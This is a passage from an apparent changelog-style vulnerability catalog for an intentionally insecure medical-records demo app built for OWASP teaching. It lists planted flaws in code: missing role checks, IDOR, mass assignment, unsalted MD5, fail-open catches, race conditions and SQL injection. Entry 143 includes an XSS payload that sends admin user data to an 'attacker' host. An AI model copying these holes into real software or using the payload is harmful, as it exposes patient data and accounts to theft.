    <Edit size={11} className="mr-1" />
    Edit
  </Button>
)}
```
The Edit button is shown for all non-patient roles (DOCTOR, LAB_TECH, PHARMACIST, ADMIN). The server-side `PUT /medical-records/{id}` endpoint (#107) has no ownership check, so a LAB_TECH or PHARMACIST can modify a record that was created by a different doctor for a different patient. Any staff member can overwrite any diagnosis in the system.

---

**112. [A01] Dispense button shown for all roles — `MedicalRecordsPage.tsx` Prescriptions tab**
```tsx
{/* [A01] No pharmacist role check — any role can dispense */}
{p.status === 'CREATED' && (
  <Button size="sm" variant="outline" onClick={() => dispenseMutation.mutate(p.id)}>
    <Pill size={11} className="mr-1" />
    Dispense
  </Button>
)}
```
The Dispense button is shown and functional for every authenticated user regardless of role. A PATIENT visiting the Prescriptions tab can dispense any CREATED prescription system-wide. Combined with #109, they can also attribute the action to a different pharmacist.

---

---

**113. [A01] `LabResultController` — `defaultValue = "0"` masked null, causing staff to see zero results — `LabResultController.java`**
```java
// Before: defaultValue = "0" → patientId = 0L (not null) → AND lr.patient_id = 0 → empty result
// After:  required = false → patientId = null when omitted → filter removed → all results exposed [A01]
@RequestParam(required = false) Long patientId
```
The original `defaultValue = "0"` caused the service to append `AND lr.patient_id = 0` when no patientId was provided, returning zero rows to staff. The fix makes patientId truly nullable so the service removes the filter — but this means any staff member (or a PATIENT navigating to `/staff`) can retrieve all patients' lab results without supplying a patientId. The A01 vulnerability (#106) is now properly observable.

---

**114. [A06] Export to clipboard in Lab Results — patient data without access check — `LabResultsPage.tsx`**
```tsx
// [A06] Copies patient ID, test name, result value, notes to clipboard — no server access check
async function handleExport(r: LabResult) {
  const lines = [`Patient: ${r.patientName} (ID: ${r.patientId})`, ...]
  await navigator.clipboard.writeText(lines.join('\n'))
  toast('[A06] Exported — patient ID included without access check', 'warning')
}
```
The Export button in the detail modal copies full lab result data (including patient ID and notes) to the clipboard. No server request is made — the data was already loaded client-side without row-level access control. Demonstrates insecure design: sensitive clinical data is available to any authenticated user who can reach the page.


---

## Messages Page — Improvements (Section 6)

### Frontend — `MessagesPage.tsx`

**115. [A01] `PATCH /api/messages/{id}/read` — no ownership check — `MessagesPage.tsx`**
```tsx
// [A01] PATCH /{id}/read has no ownership check — any user can mark any message as read
useEffect(() => {
  if (!messages.length || !user?.id) return
  const unread = messages.filter(m => !m.read && m.receiverId === user.id)
  if (!unread.length) return
  void Promise.all(unread.map(m => api.patch(`/messages/${m.id}/read`)))
    .then(() => void qc.invalidateQueries({ queryKey: ['conversations', user.id] }))
}, [messages])
```
When a conversation thread is opened, the frontend automatically sends `PATCH /messages/{id}/read` for every unread message. The backend does not verify that the caller is the intended receiver. Any authenticated user who learns a message ID can mark it read — suppressing unread badge counts for a victim without seeing the actual content. Demonstrates A01: Broken Access Control at the sub-resource operation level.

---

**116. [A01] `DELETE /api/messages/{id}` — no ownership check — `MessagesPage.tsx`**
```tsx
// [A01] No ownership check — any user can delete any message
const deleteMutation = useMutation({
  mutationFn: (id: number) => api.delete(`/messages/${id}`),
  onSuccess: () => {
    toast('[A01] Message deleted — no ownership check on server', 'warning')
  },
})
```
The trash icon appears on hover for every message bubble. Clicking it sends `DELETE /messages/{id}` directly. The server accepts the request without verifying whether the authenticated user is the sender or receiver of that message. An attacker can iterate sequential IDs to permanently delete other users' messages — a classic IDOR via destructive operation.

---

**117. [A07] Inline reply sender spoofing — `replySenderId` from form, not JWT — `MessagesPage.tsx`**
```tsx
// [A07] replySenderId is editable — user can impersonate any sender
const [replySenderId, setReplySenderId] = useState<number>(user?.id ?? 0)

<select
  value={replySenderId}
  onChange={(e) => setReplySenderId(Number(e.target.value))}
>
  {allUsers.map((u) => (
    <option key={u.id} value={u.id}>{u.username} — {u.role}</option>
  ))}
</select>

replyMutation.mutate({ senderId: replySenderId, receiverId: activeUserId, content: replyContent })
```
The inline reply form's "From" field is a `<select>` listing all platform users. `replySenderId` is read directly from the form and sent as `senderId` in the POST body. The server uses that body value to set `message.senderId` without comparing it to the authenticated user's JWT subject. Any user can impersonate any other user in their sent messages — a textbook A07 Mass Assignment / input trust violation.

---

---

## Admin Page — Improvements (Section 7)

### Backend — `AdminController.java`, `AdminService.java`

**118. [A01] `PATCH /api/admin/users/{id}/toggle` — no ADMIN role check — `AdminController.java`, `AdminService.java`**
```java
// [A01] No ADMIN role check — any authenticated user can activate or deactivate any account
@PatchMapping("/users/{id}/toggle")
public ResponseEntity<UserDto> toggleUser(@PathVariable Long id) {
    return ResponseEntity.ok(adminService.toggleUser(id));
}

// [A01] No ownership or role check — any caller can flip any user's active flag
public UserDto toggleUser(Long id) {
    User user = userRepository.findById(id).orElseThrow(...);
    user.setActive(!Boolean.TRUE.equals(user.getActive()));
    return toDto(userRepository.save(user));
}
```
The toggle endpoint sits under `/api/admin/**` which is `permitAll()` in `SecurityConfig`. Any authenticated user (or unauthenticated caller) can deactivate an ADMIN account, locking legitimate admins out of the system. No JWT subject comparison, no `@PreAuthorize("hasRole('ADMIN')")`.

---

### Frontend — `AdminPage.tsx`

**119. [A07] Create User modal — role freely settable in request body — `AdminPage.tsx`**
```tsx
// [A07] role freely settable — [A04] backend stores MD5(password) with no salt
const createUserMutation = useMutation({
  mutationFn: (body: typeof createForm) => api.post('/admin/users', body),
  ...
})

<Select value={createForm.role} ...>
  <option value="ADMIN">Administrator</option>  // selectable by any user
</Select>
```
The "+ New User" modal allows any authenticated user to create an account with any role including `ADMIN`. The `role` field is sent in the POST body and the server assigns it without caller-role enforcement. Combined with the `permitAll()` on `/api/admin/**`, the endpoint requires no token at all. Demonstrates A07 Mass Assignment at account creation.

---

**120. [A04] Password field in Create User modal rendered as plain text — `AdminPage.tsx`**
```tsx
{/* [A04] plaintext password visible in form field, stored as MD5 with no salt */}
<Input type="text" placeholder="Stored as MD5(password) with no salt" ... />
```
The password input uses `type="text"` (intentionally), so the value is visible in the browser. The backend hashes it with MD5 and no salt. Demonstrates A02: password handling failures at both ends — plaintext in transit and weak hash at rest.

---

**121. [A01] Active/Inactive toggle button — no ADMIN role check — `AdminPage.tsx`**
```tsx
// [A01] Toggle — no ADMIN role check on PATCH /admin/users/{id}/toggle
<button
  onClick={() => toggleMutation.mutate(u.id)}
  title="[A01] Toggle active — no ADMIN check on server"
>
  {u.active ? 'Active' : 'Inactive'}
</button>
```
Every user row shows a toggle button that calls `PATCH /admin/users/{id}/toggle`. The server does not verify that the caller is ADMIN. A PATIENT can deactivate the ADMIN account. The button's hover state flips green↔red to show the intended new state.

---

**122. [A04] Password hash column — copyable MD5 — `AdminPage.tsx`**
```tsx
// [A04] MD5 hash — click to copy — searchable in rainbow tables
<button onClick={() => copyHash(u)} title="[A04] Click to copy — MD5, no salt, rainbow-table searchable">
  <span>{u.passwordHash}</span>
  <Copy size={10} />
</button>
```
Clicking the password hash cell copies the MD5 value to clipboard. A toast annotates the action with `[A04] MD5 hash copied — searchable in rainbow tables`. The hash is already exposed in the GET /admin/users response; copyability reinforces that it can be directly submitted to crackstation.net or hashcat to recover the plaintext.

---

**123. [A09] Audit Log "Clear All Logs" button — no confirmation, no ADMIN check — `AdminPage.tsx`**
```tsx
// [A09] Permanently destroys the entire audit trail without authorization
const clearLogsMutation = useMutation({
  mutationFn: () => api.post('/admin/logs/clear'),
  ...
})
```
The "Clear All Logs" button in the Audit Logs tab calls `POST /admin/logs/clear` immediately with no confirmation dialog. The server deletes all rows with no authorization check, no backup, and no soft-delete. Paired with the A09 annotation banner in the tab header. The previous implementation added a `confirm()` dialog — this version removes it to demonstrate that a single click destroys the entire forensic timeline.

---

## Prescriptions Page — Improvements (Section 8)

### Frontend — `PrescriptionsPage.tsx`, `App.tsx`, `Sidebar.tsx`

**124. [A01] Patient prescription query — IDOR — `PrescriptionsPage.tsx`**
```tsx
// [A01] Patient query: IDOR — patientId not verified server-side against JWT
const { data: myRx = [] } = useQuery<Prescription[]>({
  queryKey: ['myPrescriptions', patientRecord?.id],
  enabled: isPatient && !!patientRecord?.id,
  queryFn: async () => {
    const { data } = await api.get<Prescription[]>(`/prescriptions/patient/${patientRecord!.id}`)
    return data
  },
})
```
The patient-scoped query calls `GET /prescriptions/patient/{patientId}`. The server returns prescriptions for the given `patientId` without verifying that the JWT subject matches that patient. An attacker can enumerate `patientId` values and retrieve any patient's prescription history — medication names, dosages, instructions, and dispense history — without authorization.

---

**125. [A01] Staff prescription query — all prescriptions returned to any role — `PrescriptionsPage.tsx`**
```tsx
// [A01] Staff query: no access control — returns all prescriptions to any authenticated user
const { data: allRx = [] } = useQuery<Prescription[]>({
  queryKey: ['allPrescriptions'],
  enabled: !isPatient,
  queryFn: async () => {
    const { data } = await api.get<Prescription[]>('/prescriptions')
    return data
  },
})
```
`GET /prescriptions` returns all prescriptions in the system. No role enforcement on the backend — any authenticated user (DOCTOR, NURSE, or any future role) receives the full prescription list. The client-side `!isPatient` guard is bypassable; the real exposure is the unguarded server endpoint.

---

**126. [A01] Dispense button visible and functional for all roles — `PrescriptionsPage.tsx`**
```tsx
{p.status === 'CREATED' && (
  // [A01] No pharmacist role check — shown and functional for all roles
  // [A07] pharmacistId taken from user.id in request body — not JWT-derived
  <Button onClick={() => dispenseMutation.mutate(p.id)}>
    Dispense
  </Button>
)}
```
The Dispense button is rendered for every authenticated user regardless of role. Backend `PUT /prescriptions/{id}/dispense` accepts the request without checking that the caller holds a PHARMACIST role. A PATIENT can dispense their own (or any) prescription.

---

**127. [A07] pharmacistId attributed from request body — `PrescriptionsPage.tsx`**
```tsx
// [A07] pharmacistId from request body — caller attributes dispensing to any user
const dispenseMutation = useMutation({
  mutationFn: (id: number) =>
    api.put(`/prescriptions/${id}/dispense`, { pharmacistId: user?.id }),
  ...
})
```
The dispense mutation sends `{ pharmacistId: user?.id }` in the request body. The server reads `pharmacistId` from this body field rather than extracting it from the JWT. Any caller can replace `user?.id` with any other user ID and attribute the dispense action to a different pharmacist — creating a false audit trail. This is a Mass Assignment / Insecure Direct Object Reference on the audit identity field.

---

## Async Refill Queue — A10:2025 Mishandling of Exceptional Conditions

> New module under `/api/refills` + `/refills` UI. The feature is built end-to-end to host
> A10:2025 vulnerabilities: fail-open authorisation on exceptions (CWE-636), race conditions
> on retry (CWE-362), unbounded retries (CWE-400), silent exception swallowing (CWE-755),
> generic `Throwable` catches (CWE-396), missing null checks (CWE-754), schema-permitted
> null inputs that feed validator NPEs (CWE-665), resource leaks on error paths (CWE-460),
> and raw exception text returned to callers (CWE-209). See `A10_FEATURE_PLAN.md` for the
> full design rationale and the demo attack scenarios.

---

**128. [A10] Fail-open promote to READY on any validator exception — `RefillQueueService.java`**
```java
try {
    eligibility.check(r);
    r.setStatus(RefillStatus.READY);
} catch (Exception e) {
    // [A10] FAIL-OPEN: any exception is treated as success.
    r.setFailureReason(e.toString());
    r.setStatus(RefillStatus.READY);   // [A10] fail open
}
```
The generic `catch (Exception e)` block — CWE-636 / CWE-755 — promotes the refill row to `READY` whenever the eligibility validator throws (null `quantity` NPE, timeout, constraint violation, anything). The pharmacist UI then shows a green check and the prescription can be dispensed without ever being validated. The raw `e.toString()` (CWE-209) is persisted in `failure_reason` and returned verbatim by `GET /api/refills`.

---

**129. [A10] `catch (Throwable t)` around slip printing hides every error — `RefillQueueService.java`**
```java
try {
    Path slip = slipPrinter.createSlip(r);
    r.setTempSlipPath(slip.toAbsolutePath().toString());
    refills.save(r);
} catch (Throwable t) {
    // [A10] catching Throwable — masks OOM, StackOverflow, ThreadDeath.
}
```
The `catch (Throwable t) { }` block — CWE-396 — masks every kind of failure including `OutOfMemoryError`, `StackOverflowError`, and `ThreadDeath`. The empty body is the only "log" of the failure; no metric, no audit row, no alert.

---

**130. [A10] `@Scheduled` worker swallows every exception in a single catch — `RefillQueueService.runWorker`**
```java
@Scheduled(fixedRate = 30_000)
public void runWorker() {
    try {
        for (RefillRequest r : refills.findTop50ByStatusOrderByCreatedAtAsc(...)) {
            processOne(r);
        }
    } catch (Exception e) {
        e.printStackTrace();   // [A10] CWE-755 — stderr-only, no rethrow
    }
}
```
The background worker wraps the whole tick in a single `catch (Exception)`. If any iteration throws, the catch prints to `System.err` and the tick exits silently. No metric, no audit log, no alert. The next tick starts cleanly, masking the previous failure entirely. The queue can silently stop progressing for individual rows that throw without anyone noticing.

---

**131. [A10] TOCTOU race on `dispense` — `RefillQueueService.dispense`**
```java
RefillRequest r = refills.findById(id).orElseThrow();
if (r.getStatus() != RefillStatus.READY) throw new IllegalStateException("not ready");
try { Thread.sleep(50); } catch (InterruptedException ignored) {}
r.setStatus(RefillStatus.DISPENSED);
r.setPharmacistId(pharmacistId);
return refills.save(r);
```
Status is read, compared, and written without any locking — CWE-362 / TOCTOU. Two concurrent `dispense()` calls for the same id both observe `status=READY`, both proceed, both write `DISPENSED`. Inventory decrements twice but only the second audit row is written. No `@Lock(PESSIMISTIC_WRITE)`, no `@Version` column on `RefillRequest`, no `@Transactional(isolation = SERIALIZABLE)`. The frontend "Force Concurrent Dispense" button fires 10 of these in parallel for a one-click reproduction.

---

**132. [A10] Swallowed `InterruptedException` — `RefillQueueService.dispense`**
```java
try { Thread.sleep(50); } catch (InterruptedException ignored) {}
```
CWE-705 — the swallow loses the thread's interrupt status. During graceful shutdown the JVM interrupts worker threads; this swallow lets the dispense complete anyway, producing transactions that begin after the shutdown signal.

---

**133. [A10] Validator dereferences `quantity` without a null check — `EligibilityValidator.java`**
```java
public void check(RefillRequest r) {
    if (r.getQuantity() > 0 && r.getQuantity() <= 90) return;   // [A10] CWE-754
    throw new IllegalArgumentException("quantity out of range — ...");
}
```
`r.getQuantity()` is a boxed `Integer` that may be null (schema permits null). The unboxing comparison throws `NullPointerException` on every null. Combined with vulnerability #128 (fail-open catch), null `quantity` bypasses the entire eligibility check.

---

**134. [A10] Schema permits the null that triggers the NPE — `V16__create_refill_requests.sql`**
```sql
quantity INT NULL,
```
CWE-665 — the column is nullable on purpose. The frontend "Request Refill" button submits `quantity: null` so that the validator NPE is reproducible on the first worker tick. There is also no `UNIQUE (prescription_id, status='READY')` constraint, leaving the CWE-362 double-dispense race fully open.

---

**135. [A10] Slip write happens outside try/finally — `SlipPrinter.createSlip`**
```java
Path tmp = Files.createTempFile("refill-", ".slip");
Files.writeString(tmp, render(r));   // [A10] CWE-460 — if this throws, the temp file lingers
return tmp;
```
CWE-460 — improper cleanup on thrown exception. If `render` or `writeString` throws after the file is created, the partially-written temp file is never deleted. Repeated retries (vulnerability #138) fill the server's temp directory until the filesystem is exhausted.

---

**136. [A10] Raw exception text leaked in `failureReason` — `RefillRequestDto.java` + `GET /api/refills`**
```java
@Data @Builder
public class RefillRequestDto {
    ...
    private String failureReason;   // [A10][A09] raw java exception .toString()
}
```
`failureReason` carries the raw `e.toString()` of every swallowed validator exception: fully-qualified exception class, original message, DB constraint and table names. The list endpoint returns it verbatim — CWE-209 — and the React table renders it with `dangerouslySetInnerHTML`, turning a thrown exception into a stored-XSS payload that ships to every viewer.

---

**137. [A10][A09] Absolute filesystem path leaked in `tempSlipPath` — `RefillRequestDto.java`**
The `tempSlipPath` field exposes the JVM's resolved temp-file path (e.g. `/tmp/refill-1234567890.slip` or `/var/folders/.../T/refill-…`). Any caller of `GET /api/refills` reads internal filesystem layout used by the server process — useful reconnaissance for path-traversal sinks elsewhere in the codebase.

---

**138. [A10] `/refills/{id}/retry` has no max-retry guard — `RefillController.java`**
```java
@PostMapping("/{id}/retry")
public ResponseEntity<RefillRequestDto> retry(@PathVariable Long id) {
    return ResponseEntity.ok(refills.retry(id));
}
```
CWE-400 — no max-retry value, no rate limit. Each retry re-enters `processOne` which calls `SlipPrinter.createSlip` and creates a new temp file (vulnerability #135). A `while true` curl loop from a single attacker exhausts the server's temp filesystem.

---

**139. [A01][A10] `/api/refills/**` mapped to `permitAll()` — `SecurityConfig.java`**
```java
.requestMatchers("/api/refills/**").permitAll()
```
Anonymous callers can submit `quantity: null`, fire the concurrent-dispense race, hit the unbounded retry, and read the leaked `failureReason` / `tempSlipPath` from every row. A01 compounds A10 — no authentication is required to exercise any of the error-path defects.

---

**140. [A10] "Request Refill" frontend button sends `quantity: null` on purpose — `PrescriptionsPage.tsx`**
```tsx
api.post('/refills', {
  prescriptionId: p.id,
  patientId: p.patientId,
  requestedBy: user?.id ?? null,
  quantity: null,    // [A10] CWE-754 — triggers backend validator NPE → fail-open
})
```
The new "Refill" action button on every prescription row submits `quantity: null` so the backend validator NPEs and the fail-open chain promotes the new refill request to `READY` without ever checking eligibility. `requestedBy` is also body-supplied (`[A07]`).

---

**141. [A10] Dispense button on `RefillsPage` not disabled in-flight — `RefillsPage.tsx`**
```tsx
<Button onClick={() => dispenseMutation.mutate(r.id)}>Dispense</Button>
```
The button is rendered without `disabled={dispenseMutation.isPending}`. A single rapid double-click reproduces the CWE-362 TOCTOU race from the UI; the explicit "Force Concurrent Dispense" button (vulnerability #142) is provided for guaranteed reproduction.

---

**142. [A10] "Force Concurrent Dispense" demo button — `RefillsPage.tsx`**
```tsx
await Promise.all(
  Array.from({ length: 10 }).map(() =>
    api.post(`/refills/${id}/dispense`, { pharmacistId: user?.id })))
```
Fires 10 parallel `POST /refills/{id}/dispense` against the same row using `Promise.all`. With no `@Version` column and no row-level lock in the backend, the server services every call against the same `READY` state — the inventory decrement happens ten times but only the last audit-log row is written. Reproducible from the classroom UI without a load-test tool.

---

**143. [A10][A05] `failureReason` rendered with `dangerouslySetInnerHTML` — `RefillsPage.tsx`, `AdminPage.tsx`, `ProfilePage.tsx`**
```tsx
<div dangerouslySetInnerHTML={{ __html: r.failureReason }} />
```
The raw `failureReason` returned by the API is interpolated as HTML in three places (queue table, admin panel, patient profile). An attacker who can shape a thrown exception (`<script>fetch('/api/admin/users').then(r=>r.text()).then(t=>navigator.sendBeacon('//attacker',t))</script>`) plants a stored XSS payload that fires the next time any user views one of those pages. Extends the existing Messages-page XSS pivot (#84).

---

**144. [A10][CWE-209] Stack-Trace Inspector panel — `RefillsPage.tsx`**
```tsx
<pre>{selected.failureReason ?? '(none)'}</pre>
<pre>{selected.tempSlipPath ?? '(none)'}</pre>
```
The detail dialog renders `failureReason` and `tempSlipPath` verbatim in `<pre>` blocks — same pattern as the existing Token Inspector widget (#83). The inspector turns every swallowed backend exception into a directly readable reconnaissance surface for the API caller.

---

## Admin View Redesign — Module A (Users & Accounts)

> Backend split: `AdminController` → `AdminUserController` + `AdminUserService` (user methods moved out). UI split: `pages/AdminPage.tsx` Users tab → `pages/admin/AdminUsersPage.tsx` + `pages/admin/AdminUserDetailPage.tsx`, with new `components/admin/ImpersonateBanner.tsx`. Frontend layout shell added: `auth/AdminRoute.tsx`, `components/admin/AdminSidebar.tsx`, `components/admin/AdminLayout.tsx`. See `ADMIN_VIEW_PLAN.md`.

### New Files

| File | Description |
|---|---|
| `controller/AdminUserController.java` | All `/api/admin/users/**` endpoints (list, detail, create, update, delete, unlock, reset-password, impersonate, bulk-delete, toggle) |
| `service/AdminUserService.java` | New service backing AdminUserController; user methods migrated from `AdminService` plus new endpoints |
| `dto/AdminUserDetailDto.java` | Returned by `GET /admin/users/{id}` — includes recent audit logs with raw stack traces |
| `dto/ImpersonationResponseDto.java` | Returned by `POST /admin/users/{id}/impersonate` — contains JWT + impersonation marker |
| `dto/ResetPasswordResponseDto.java` | Returned by `POST /admin/users/{id}/reset-password` — plaintext password |
| **Frontend** `pages/admin/AdminUsersPage.tsx` | Replaces Users tab of old `AdminPage.tsx`; adds filters + bulk-delete + new actions |
| **Frontend** `pages/admin/AdminUserDetailPage.tsx` | Full per-user view incl. recent audit logs |
| **Frontend** `components/admin/ImpersonateBanner.tsx` | Sticky banner shown when an impersonation flag exists |
| **Frontend** `components/admin/AdminSidebar.tsx`, `AdminLayout.tsx` | Admin-only shell |
| **Frontend** `auth/AdminRoute.tsx` | Wrapper that **deliberately omits** `requiredRole` |
| **Frontend** `api/admin.ts` | Typed client wrappers for all `/api/admin/users/**` endpoints |

### Vulnerabilities

**145. [A01] AdminUserController under permitAll() — `AdminUserController.java`**
```java
@RestController
@RequestMapping("/api/admin/users")
public class AdminUserController { /* no @PreAuthorize anywhere */ }
```
Every endpoint below the `/api/admin/users/**` prefix is reachable by any caller (unauthenticated callers included, since `SecurityConfig` maps `/api/admin/**` to `permitAll()`). The split into a dedicated controller does not introduce role enforcement — that is the demo.

---

**146. [A01] Detail endpoint returns audit log with stack traces — `AdminUserService.java#getDetail`**
```java
List<AuditLog> recent = logs.stream()
        .sorted(Comparator.comparing(AuditLog::getCreatedAt, ...).reversed())
        .limit(10)
        .collect(Collectors.toList());
return AdminUserDetailDto.builder()
        .user(toDto(user))
        .recentLogs(recent.stream().map(this::toLogDto).collect(Collectors.toList()))
        .lastLoginIp(lastLogin != null ? lastLogin.getIpAddress() : null)
        .build();
```
The 10 most recent audit log entries for the target user are returned verbatim, including the `details` column which holds full JVM stack traces written by `LoggingInterceptor`. Combined with A01 (no role check), any caller reads any user's recent activity, IP history, and the internal framework versions / package layout disclosed in stack frames.

---

**147. [A07] PUT /admin/users/{id} mass assignment of every field except role — `AdminUserService.java#updateUser`**
```java
if (body.containsKey("passwordHash")) user.setPasswordHash((String) body.get("passwordHash"));
if (body.containsKey("lockedUntil"))  user.setLockedUntil(...);
if (body.containsKey("failedLoginAttempts")) user.setFailedLoginAttempts(...);
if (body.containsKey("active"))       user.setActive(Boolean.TRUE.equals(body.get("active")));
```
Caller may write a precomputed `passwordHash`, clear `lockedUntil`, reset `failedLoginAttempts`, or flip `active` without going through any service-layer validation. `passwordHash` is written raw (bypassing `PasswordUtils.hashPassword()` entirely) — attacker can paste in a known MD5 they pre-computed offline.

Role updates intentionally **still** flow through the existing `UserController.PUT /users/{id}/role` (vulnerability #87) so the existing UI Change-Role modal keeps working and the A07 demo stays split between two endpoints.

---

**148. [A01][A09] DELETE /admin/users/{id} hard-delete of any account — `AdminUserController.java`, `AdminUserService.java#deleteUser`, `V17__cascade_user_fks.sql`**
```java
@DeleteMapping("/{id}")
public ResponseEntity<Map<String, Object>> delete(@PathVariable Long id) { ... }
// service:
userRepository.deleteById(id);
```
```sql
-- V17: every users(id) FK now ON DELETE CASCADE
ALTER TABLE audit_logs      ADD CONSTRAINT fk_audit_user      FOREIGN KEY (user_id)       REFERENCES users(id) ON DELETE CASCADE;
ALTER TABLE messages        ADD CONSTRAINT fk_msg_sender      FOREIGN KEY (sender_id)     REFERENCES users(id) ON DELETE CASCADE;
ALTER TABLE prescriptions   ADD CONSTRAINT fk_rx_pharmacist   FOREIGN KEY (pharmacist_id) REFERENCES users(id) ON DELETE CASCADE;
ALTER TABLE lab_results     ADD CONSTRAINT fk_lab_tech_user   FOREIGN KEY (lab_tech_id)   REFERENCES users(id) ON DELETE CASCADE;
ALTER TABLE refill_requests ADD CONSTRAINT fk_refill_pharmacist FOREIGN KEY (pharmacist_id) REFERENCES users(id) ON DELETE CASCADE;
-- (patients/doctors and remaining msg FK similarly cascaded)
```
No role check, no soft-delete, no archival. **V17 turned every `users(id)` FK into `ON DELETE CASCADE`** to make the endpoint actually succeed instead of throwing a `DataIntegrityViolationException` — which means a single DELETE wipes the user's audit entries (evidence destruction, A09 compound), the messages they sent and received (conversation history), the prescriptions they dispensed, and the lab results they certified. A PATIENT calling this on the only ADMIN account erases the admin's audit trail in one request.

---

**149. [A07] POST /admin/users/{id}/unlock neutralises brute-force lockout — `AdminUserService.java#unlock`**
```java
public UserDto unlock(Long id) {
    User user = userRepository.findById(id).orElseThrow(...);
    user.setLockedUntil(null);
    user.setFailedLoginAttempts(0);
    return toDto(userRepository.save(user));
}
```
Compound chain: attacker brute-forces a target → account locks → attacker calls `POST /admin/users/{id}/unlock` themselves (no role check) → continues brute-forcing. Effectively eliminates the lockout protection in `AuthService`. No rate limit on the unlock call itself.

---

**150. [A02] POST /admin/users/{id}/reset-password returns plaintext + writes it to audit log — `AdminUserService.java#resetPassword`, `ResetPasswordResponseDto.java`**
```java
String newPassword = generateRandomPassword();
String hash = passwordUtils.hashPassword(newPassword);
user.setPasswordHash(hash);
return ResetPasswordResponseDto.builder()
        .newPassword(newPassword)          // [A02] plaintext in HTTP response body
        .newPasswordHash(hash)             // [A06] also exposes the MD5
        ...
```
Plaintext leaves the system in two ways:

1. Returned in the response body so the admin UI can display & copy it. UI keeps the value in component state with no auto-clear.
2. `ContentCachingFilter` + `LoggingInterceptor` capture the response body and persist it into `audit_logs.details`. Anyone with `GET /api/admin/logs` access (no role check, #67) reads every password ever reset.

The random password itself is generated with `java.util.Random` instead of `SecureRandom` — predictable from process state ([A06]).

---

**151. [A01][A07] POST /admin/users/{id}/impersonate mints JWT for any user with no audit trail — `AdminUserService.java#impersonate`, `ImpersonationResponseDto.java`**
```java
public ImpersonationResponseDto impersonate(Long id) {
    User user = userRepository.findById(id).orElseThrow(...);
    UserPrincipal principal = new UserPrincipal(user);
    String token = jwtUtil.generateToken(principal);
    return ImpersonationResponseDto.builder().token(token)...build();
}
```
Issues a JWT signed with the same key as a normal login token (`JwtUtil.generateToken`). The token is indistinguishable from a real authentication — no `impersonated_by` claim, no audit entry for the act of impersonation itself, no MFA. A PATIENT calling this endpoint receives a valid ADMIN session.

UI compound (`AdminUsersPage.tsx` impersonate button): the returned token is written into the same `localStorage.token` slot used by `AuthContext`, so the original admin session is silently overwritten.

---

**152. [A04][A09] POST /admin/users/bulk-delete unbounded batch — `AdminUserController.java`, `AdminUserService.java#bulkDelete`**
```java
@PostMapping("/bulk-delete")
public ResponseEntity<Map<String, Object>> bulkDelete(@RequestBody Map<String, List<Long>> body) {
    return ResponseEntity.ok(adminUserService.bulkDelete(body.getOrDefault("ids", List.of())));
}
// service:
userRepository.deleteAllById(ids);
```
No upper bound on the batch size — caller may pass thousands of ids in one request. Two impacts:

- **A04 DoS / Insecure Design**: a single request can saturate the JDBC connection pool and lock the `users` table.
- **A09**: `LoggingInterceptor` writes one audit entry per HTTP call, not one per affected id, so the per-user audit trail vanishes inside a single oversized request body.

---

**153. [A06] generateRandomPassword uses java.util.Random — `AdminUserService.java#generateRandomPassword`**
```java
Random r = new Random();
StringBuilder sb = new StringBuilder(12);
for (int i = 0; i < 12; i++) sb.append(alphabet.charAt(r.nextInt(alphabet.length())));
```
`java.util.Random` is a linear congruential generator. Given a handful of generated values an attacker recovers the seed and predicts every subsequent password reset. Should be `SecureRandom`. Combined with the A02 leak (#150) the password leaves the system *and* the next one is predictable.

---

**154. [A06] AdminUserDetailDto + UserDto.passwordHash returned by detail endpoint — `AdminUserDetailDto.java`, `UserDto.java` (existing #79 family)**
```java
private UserDto user;  // user.passwordHash returned in every response
```
Extends the existing passwordHash-exposure family to a per-user detail page. `AdminUserDetailPage.tsx` displays the hash in plain DOM with a copy button, and stores it inside the React Query cache where any other component on the same page can read it.

---

**155. [A01] AdminRoute does not enforce role — `auth/AdminRoute.tsx` (frontend)**
```tsx
export function AdminRoute({ children }: { children: ReactNode }) {
  const { isAuthenticated, token } = useAuth()
  if (!isAuthenticated || !token) return <Navigate to="/login" replace />
  return <>{children}</>
}
```
`ProtectedRoute.tsx` already supports `requiredRole` (#78). The new `AdminRoute` wrapper deliberately omits it so the entire `/admin/*` subtree remains reachable by every authenticated role — mirroring the `permitAll()` setting on the backend. Adding `requiredRole="ADMIN"` would close the demo.

---

**156. [A01][A04] ImpersonateBanner can be hidden by clearing one localStorage key — `components/admin/ImpersonateBanner.tsx` (frontend)**
```tsx
export function setImpersonationState(state: ImpersonationState): void {
  localStorage.setItem(IMPERSONATION_FLAG, JSON.stringify(state))
}
export function clearImpersonationState(): void {
  localStorage.removeItem(IMPERSONATION_FLAG)
}
```
The impersonation flag is stored separately from the JWT under the `mediconnect.impersonation` key. **Deleting the flag (e.g. from DevTools) hides the banner without affecting the JWT** — the session continues as the victim and no UI signal remains. The plan (§5.6) calls this out as a deliberate UX hole that makes the A01 demo visually undetectable.

---

**157. [A01] AdminUsersPage actions all toast OWASP tags but exercise no client-side validation — `pages/admin/AdminUsersPage.tsx` (frontend)**
```tsx
toast('[A01] Impersonating ${data.impersonatedUsername} — page reload required', 'warning')
toast('[A09] User hard-deleted — no soft-delete, no archive', 'warning')
toast('[A04] Bulk-deleted ${data.deleted}/${data.requested} users in one call', 'warning')
```
Every privileged action displays its OWASP tag so the demo is legible (plan §5.6) — but the corresponding mutation calls fire on click with no client-side authorization check, no confirm dialog for impersonation, and no rate limit. Compound effect: a PATIENT who navigates to `/admin/users` directly can chain `unlock → impersonate → bulk-delete` in three clicks.

---

## Admin View Redesign — Module D (Audit & Forensics)

> Backend split: `AdminController` audit endpoints (`/logs`, `/logs/clear`) → `AdminAuditController` + `AdminAuditService`, plus three new endpoints (`GET /logs/{id}`, `DELETE /logs/{id}`, `GET /logs/export`). UI: dedicated `pages/admin/AdminLogsPage.tsx` (replacing the old AdminPage Audit Logs tab) and `pages/admin/AdminLogDetailPage.tsx`.

### New Files

| File | Description |
|---|---|
| `controller/AdminAuditController.java` | `/api/admin/logs/**` — list with filters, get-one, delete-one, clear-all, export (csv/json/xml) |
| `service/AdminAuditService.java` | Backs the controller; native-SQL search, CSV/XML formatters, XXE-prone `renderXmlWithTemplate` |
| **Frontend** `pages/admin/AdminLogsPage.tsx` | Full migration of the old Audit Logs tab; new filter bar + Export dropdown + selective delete |
| **Frontend** `pages/admin/AdminLogDetailPage.tsx` | Renders `details` (stack trace) via `dangerouslySetInnerHTML` |
| **Frontend** `api/admin.ts#auditApi` | Typed client wrappers + `exportUrl(format, filters)` |

### Vulnerabilities

**158. [A03] SQL Injection in audit log search — `AdminAuditService.java#search`**
```java
StringBuilder sql = new StringBuilder("SELECT id, user_id, action, entity_type, ... FROM audit_logs WHERE 1=1");
if (action != null && !action.isBlank()) sql.append(" AND action = '").append(action).append("'");
